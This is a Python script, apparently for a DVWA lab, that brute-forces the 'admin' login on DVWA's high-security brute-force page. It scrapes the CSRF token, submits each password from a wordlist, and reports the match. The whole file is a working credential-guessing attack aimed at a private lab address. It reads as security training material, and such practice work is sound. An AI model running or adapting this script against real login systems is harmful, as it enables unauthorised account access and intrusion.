# This python script requires 3 arguments when running it:
# 1. The script filename.
# 2. The location and the filename of the wordlist.
# 3. The success message to zoom in to: "Welcome"
# Example: python dvwa_brute_high.py /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt "Welcome"

import sys
import requests
from bs4 import BeautifulSoup

# Give our arguments more semantic-friendly names
script, filename, success_message = sys.argv

# Open the password file
with open(filename, 'r') as f:
    passwords = f.read().splitlines()

# Set up our target URL and session
url = 'http://10.12.1.42:8081/vulnerabilities/brute/index.php'
cookie = {'security': 'high', 'PHPSESSID': 'meb534uq35qnhacfea0pmncib4'}
s = requests.Session()

# Get the initial CSRF token from the target site
target_page = s.get(url, cookies=cookie)
soup = BeautifulSoup(target_page.text, 'html.parser')
csrf_token = soup.find(attrs={"name": "user_token"})['value']

# Initialize a variable to track success
success = False

# Loop through passwords and perform the brute force attack
for password in passwords:
    # Setup the payload
    payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
    r = s.get(url, cookies=cookie, params=payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Debugging: Print the response content
    print(f"Attempt with password '{password}':")
    print(soup.text)

    # Check for success message
    if success_message in soup.text:
        success = True
        print('Password is:', password)
        break

# Check if the brute force was successful
if not success:
    print('Brute force failed. No matches found.')
